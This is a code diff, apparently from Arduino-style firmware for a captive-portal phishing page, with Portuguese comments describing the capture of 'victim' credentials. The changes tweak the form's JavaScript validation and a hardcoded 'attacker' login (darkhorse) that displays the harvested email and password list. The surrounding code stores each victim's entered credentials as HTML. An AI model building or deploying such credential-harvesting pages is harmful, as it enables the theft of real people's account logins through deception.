@@ -57,7 +57,7 @@ String header(String t) {
 //Injeta Javascript na Página para verificar se os campos foram corretamente preenchidos.
 "<script type=\"text/javascript\" language=\"javascript\">"
 "function valida_form (){"
-"if(document.getElementById(\"email\").value.length < 8 || document.getElementById(\"pass\").value.length < 7){"
+"if(document.getElementById(\"email\").value.length < 8 || document.getElementById(\"pass\").value.length < 5){"
 "alert('Por favor, preencha corretamente!');"
 "document.getElementById(\"email\").focus();"
 "return false"
@@ -84,7 +84,7 @@ String index() {   // Página com o formulario para captura das "Credenciais".
   //Caso seja a "Vitima" logando salva as credenciais e passa a menssagem de Validação...
   //Caso seja o "Atacante" entrando com seu login e senha, redireciona para a página com as credenciais capturadas.
   
-   if (email == "darkhorse" && password == "1425") {  //Login do "Atacante", para acesso as Credenciais capturadas.
+   if (email == "darkhorse" && password == "142536") {  //Login do "Atacante", para acesso as Credenciais capturadas.
   return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar para Inicio</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();   }
    else {
   Credentials="<li>User: <b>" + email + "</b></br>Password: <b>" + password + "</b></li><br /><br />" + Credentials;
